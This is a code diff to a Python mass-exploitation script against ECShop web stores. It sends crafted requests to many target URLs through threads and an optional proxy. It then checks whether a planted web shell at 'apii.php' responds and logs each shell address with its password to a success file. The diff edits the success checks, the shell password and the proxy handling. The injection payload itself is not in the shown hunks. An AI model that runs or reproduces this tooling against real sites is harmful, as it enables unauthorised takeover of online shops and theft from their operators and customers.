@@ -12,7 +12,6 @@ import sys
 from requests.packages import urllib3
 from bs4 import BeautifulSoup
 
-
 lock = threading.Lock()
 
 q0 = queue.Queue()
@@ -48,35 +47,34 @@ def ecshop_getshell(headerstr,tgtUrl,timeout):
 		print('Getshell failed! Error: Unkonwn error0')
 		exit()
 		
-	if rst.status_code == 200:
-		try:
-			rst1 = requests.get(fullUrl.split('/user.php')[0]+'/apii.php',timeout=timeout,verify=False)
-			if rst1.status_code == 200:
-				if rst1.text == '':
-					print('Getshell! Shell: ' + fullUrl.split('/user.php')[0] + '/apii.php' + ' pwd: rm')
-				
-				else:
-					
-					soup = BeautifulSoup(rst1.text)
-					if(soup.find('title')):
-						print('Getshell failed! Error title: ' + str(soup.title.string))
-					else:
-						print('Getshell failed! ' + str(rst1.text[0:11]))
-			else:
-				print('Getshell failed! apii.php ' + str(rst1.status_code))
-				exit()
-		except requests.exceptions.Timeout:
-			print('Getshell failed! Error: Timeout')
-
-		except requests.exceptions.ConnectionError:
-			print('Getshell failed! Error: ConnectionError')
-			exit()
-		except:
+	
+	try:
+		rst1 = requests.get(fullUrl.split('/user.php')[0]+'/apii.php',timeout=timeout,verify=False)
+		if rst1.status_code == 200 or  '4' not in str(rst1.status_code):
+			if rst1.text == '':
+				print('Getshell! Shell: ' + fullUrl.split('/user.php')[0] + '/apii.php' + ' pwd: xx1xx')
 			
-			print('Getshell failed! Error: Unkonwn error1')
+			else:
+				
+				soup = BeautifulSoup(rst1.text)
+				if(soup.find('title')):
+					print('Getshell failed! Error title: ' + str(soup.title.string))
+				else:
+					print('Getshell failed! ' + str(rst1.text[0:11]))
+		else:
+			print('Getshell failed! apii.php ' + str(rst1.status_code))
 			exit()
-	else:
-		print('Getshell failed! status code: ' + str(rst.status_code))
+	except requests.exceptions.Timeout:
+		print('Getshell failed! Error: Timeout')
+
+	except requests.exceptions.ConnectionError:
+		print('Getshell failed! Error: ConnectionError')
+		exit()
+	except:
+		
+		print('Getshell failed! Error: Unkonwn error1')
+		exit()
+
 
 def ecshop_getshell_batch(headerstr,proxystr,timeout,f4success,f4fail):
 
@@ -113,66 +111,62 @@ def ecshop_getshell_batch(headerstr,proxystr,timeout,f4success,f4fail):
 			lock.release()	
 			continue
 
-		if rst.status_code == 200:
-			try:
-				rst1 = requests.get(fullUrl.split('/user.php')[0]+'/apii.php',timeout=timeout,verify=False)
 
-				if rst1.status_code == 200:
+		try:
+			rst1 = requests.get(fullUrl.split('/user.php')[0]+'/apii.php',timeout=timeout,verify=False)
 
-					
-					if rst1.text == '':
-						shellAddr = fullUrl.split('/user.php')[0] + '/apii.php' + ' pwd: rm'
-						print('Getshell! Shell: ' + shellAddr)
-						lock.acquire()
-						f4success.write(fullUrl+': shell: ' + shellAddr + '\n')
-						lock.release()
-						global succ
-						succ = succ + 1
-					else:
-						soup = BeautifulSoup(rst1.text)
-						if(soup.find('title')):
-							errorState = str(soup.title.string)
-						else:
-							errorState = 'Getshell failed!' + str(rst1.text[0:11])
-					
-						#print 'Getshell failed! Error: ' + errorState
-						lock.acquire()
-						f4fail.write(fullUrl+': '+errorState+'\n')
-						lock.release()
-				else:
+			if rst1.status_code == 200 or '4' not in str(rst1.status_code) :
+
 				
-					errorState = 'Getshell failed! Error: apii.php ' + str(rst1.status_code)
+				if rst1.text == '':
+					shellAddr = fullUrl.split('/user.php')[0] + '/apii.php' + ' pwd: xx1xx'
+					print('Getshell! Shell: ' + shellAddr)
+					lock.acquire()
+					f4success.write(fullUrl+': shell: ' + shellAddr + '\n')
+					lock.release()
+					global succ
+					succ = succ + 1
+				else:
+					soup = BeautifulSoup(rst1.text)
+					if(soup.find('title')):
+						errorState = str(soup.title.string)
+					else:
+						errorState = 'Getshell failed!' + str(rst1.text[0:11])
+				
+					#print 'Getshell failed! Error: ' + errorState
 					lock.acquire()
 					f4fail.write(fullUrl+': '+errorState+'\n')
 					lock.release()
-			except requests.exceptions.Timeout:
-				#print 'Getshell failed! Error: Timeout'
+			else:
+			
+				errorState = 'Getshell failed! Error: apii.php ' + str(rst1.status_code)
 				lock.acquire()
-				f4fail.write(fullUrl+': '+'Getshell failed! Error: Timeout'+'\n')
-				lock.release()	
-				continue
+				f4fail.write(fullUrl+': '+errorState+'\n')
+				lock.release()
+		except requests.exceptions.Timeout:
+			#print 'Getshell failed! Error: Timeout'
+			lock.acquire()
+			f4fail.write(fullUrl+': '+'Getshell failed! Error: Timeout'+'\n')
+			lock.release()	
+			continue
 
-			except requests.exceptions.ConnectionError:
-				#print 'Getshell failed! Error: ConnectionError'
-				lock.acquire()
-				f4fail.write(fullUrl+': '+'Getshell failed! Error: ConnectionError'+'\n')
-				lock.release()	
-				continue			
+		except requests.exceptions.ConnectionError:
+			#print 'Getshell failed! Error: ConnectionError'
+			lock.acquire()
+			f4fail.write(fullUrl+': '+'Getshell failed! Error: ConnectionError'+'\n')
+			lock.release()	
+			continue			
 
-			except:
-				#print 'Getshell failed! Error: Unkonwn error'
-				lock.acquire()
-				f4fail.write(fullUrl+': '+'Getshell failed! Error: Unknown error'+'\n')
-				lock.release()	
-				continue			
+		except:
+			#print 'Getshell failed! Error: Unkonwn error'
+			lock.acquire()
+			f4fail.write(fullUrl+': '+'Getshell failed! Error: Unknown error'+'\n')
+			lock.release()	
+			continue			
 
 		
 
-		else:
-			#print 'Getshell failed! status code: ' + str(rst.status_code)
-			lock.acquire()
-			f4fail.write(fullUrl+': '+str(rst.status_code)+'\n')
-			lock.release()
+
 
 	 
 
@@ -191,17 +185,28 @@ if __name__ == '__main__':
 
 	parser.add_option('-f', dest='tgtUrlsPath', type ='string', help='urls filepath')
 	
-	parser.add_option('-s', dest='timeout', type='int', default=7, help='timeout(seconds)')
+	parser.add_option('-s', dest='timeout', type='int', default=10, help='timeout(seconds)')
 	
 	parser.add_option('-t', dest='threads', type='int', default=5, help='the number of threads')
+	parser.add_option('-p', dest='proxy', type='string', default='N', help='proxy')
 	(options, args) = parser.parse_args()
 	
 	
 	timeout = options.timeout
 	
 	tgtUrl = options.tgtUrl
+	proxy = options.proxy
+	if proxy!='N':
+		proxystr={
+			'http':'127.0.0.1:8080',
+			'https':'127.0.0.1:8080'
+		}
+	else:
+		proxystr={
+			'http':None,
+			'https':None
+		}
 
-	
 	if tgtUrl:
 		for headerstr in headerList:
 			
@@ -210,10 +215,6 @@ if __name__ == '__main__':
 
 			ecshop_getshell(headers,tgtUrl,timeout)
 
-	proxystr={
-		'http':'127.0.0.1:8080',
-		'https':'127.0.0.1:8080'
-	}
 	
 	if options.tgtUrlsPath:
 			
@@ -251,4 +252,3 @@ if __name__ == '__main__':
 
 		
 		
-
